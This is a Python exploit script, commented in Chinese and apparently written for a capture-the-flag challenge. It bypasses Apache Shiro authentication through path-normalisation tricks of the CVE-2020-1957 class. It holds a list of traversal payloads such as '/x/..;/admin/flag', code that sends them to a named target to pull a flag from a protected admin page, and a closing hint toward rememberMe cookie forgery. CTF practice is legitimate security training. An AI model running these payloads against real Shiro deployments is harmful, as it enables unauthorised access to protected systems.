#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""shiro-web —— Shiro 路径归一化鉴权绕过（CVE-2020-1957 类），仅标准库

目标: http://kudxmerczf9yq7ov.neu-nex.fun

现象:
  Cookie rememberMe=AAAA -> Set-Cookie=<REDACTED> 存在）
  GET /admin/flag -> 302 Location: /login;jsessionid=...（被 authc 过滤链拦截）
  GET /login      -> 404（没有登录页）

原理:
  Shiro 用**原始 URI** 匹配过滤器链，Spring/容器之后才做路径归一化；
  /x/..;/admin/flag 归一化后落到 /admin/flag，但过滤器看到的是 /x/..;，于是放行。

用法:
  python exp.py                    # 先打直连看 302，再依次试归一化变体
  python exp.py http://host:port   # 换实例
"""
import re
import sys
import urllib.error
import urllib.request

BASE = "http://kudxmerczf9yq7ov.neu-nex.fun"
ARGS = [a for a in sys.argv[1:] if not a.startswith("--")]
if ARGS:
    BASE = ARGS[0].rstrip("/")

FLAG_RE = re.compile(r"(?:flag|nex|FLAG|NEX)\{[^}]{1,200}\}")
VARIANTS = [
    "/admin/flag",          # 直连，应当 302
    "/x/..;/admin/flag",    # 主命中
    "/x/..;/admin/flag/",
    "/;/admin/flag",
    "/.;/admin/flag",
    "/x/../admin/flag",     # 被容器归一化，通常 302/404
    "/admin/flag;",
]


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


OPENER = urllib.request.build_opener(NoRedirect)


def get(path, headers=None):
    req = urllib.request.Request(BASE + path, headers=headers or {})
    try:
        with OPENER.open(req, timeout=15) as r:
            return r.status, dict(r.headers), r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read().decode("utf-8", "replace")


def main():
    print("[*] target:", BASE)

    st, hdrs, _ = get("/admin/flag", {"Cookie": "rememberMe=AAAA"})
    key = "deleteMe" in str(hdrs.get("Set-Cookie", ""))
    print("[*] 直连 /admin/flag ->", st, "| Shiro deleteMe:", key)
    print("    Location:", hdrs.get("Location", "-"))

    flag = None
    for path in VARIANTS:
        st, hdrs, body = get(path)
        m = FLAG_RE.search(body)
        mark = "  <<< FLAG" if m else ""
        print("[%3s] %-24s len=%-4d%s" % (st, path, len(body), mark))
        if m and not flag:
            flag = m.group(0)

    if flag:
        print("\n[+] FLAG:", flag)
        return 0
    print("\n[-] 未命中：换 ;/%2e/.. 变体，或考虑 rememberMe 伪造（需 key + gadget）")
    return 1


if __name__ == "__main__":
    sys.exit(main())
